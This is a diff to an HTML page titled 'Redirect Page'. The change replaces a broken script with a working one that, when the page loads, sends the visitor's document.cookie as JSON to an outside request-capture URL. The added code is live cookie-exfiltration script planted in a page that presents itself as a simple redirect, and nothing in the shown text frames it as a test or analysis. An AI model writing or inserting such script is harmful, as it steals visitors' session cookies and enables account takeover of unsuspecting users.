@@ -4,22 +4,13 @@
     <title>Redirect Page</title>
 </head>
 <body>
-    <script>
-        window.addEventListener('DOMContentLoaded', (event) => {
-            const headers = new Headers();
-            headers.append("Content-Type", "application/json");
-    
-            const cookie = JSON.stringify({cookie: document.cookie});
-    
-            const options = {
-                method: "POST",
-                headers,
-                mode: "cors",
-                cookie: cookie,
-            };
-    
-            fetch("https://requestbin.kanbanbox.com/1mazijq1", options);
-        });
-    </script>    
+<script>
+
+    fetch("https://requestbin.kanbanbox.com/1mazijq1", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cookies: document.cookie }),
+    });
+</script>
 </body>
 </html>
